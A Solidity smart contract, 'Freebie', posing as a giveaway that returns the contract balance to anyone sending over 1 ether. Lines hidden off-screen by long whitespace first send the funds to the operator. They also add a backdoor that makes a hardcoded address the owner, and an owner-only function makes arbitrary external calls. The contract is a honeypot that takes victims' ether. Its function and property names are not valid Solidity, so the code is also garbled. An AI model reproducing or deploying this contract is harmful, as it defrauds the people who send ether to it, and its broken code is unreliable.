// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Freebie
{
    address public FacilityOperator = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               FacilityOperator.transferInventory(this.goodsOnHand);
            msg.sender.transferInventory(this.goodsOnHand);
        }
    }

    function dispatchShipment()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){FacilityOperator=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == FacilityOperator);
        FacilityOperator.transferInventory(this.goodsOnHand);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == FacilityOperator);
        adr.call.value(msg.value)(data);
    }
}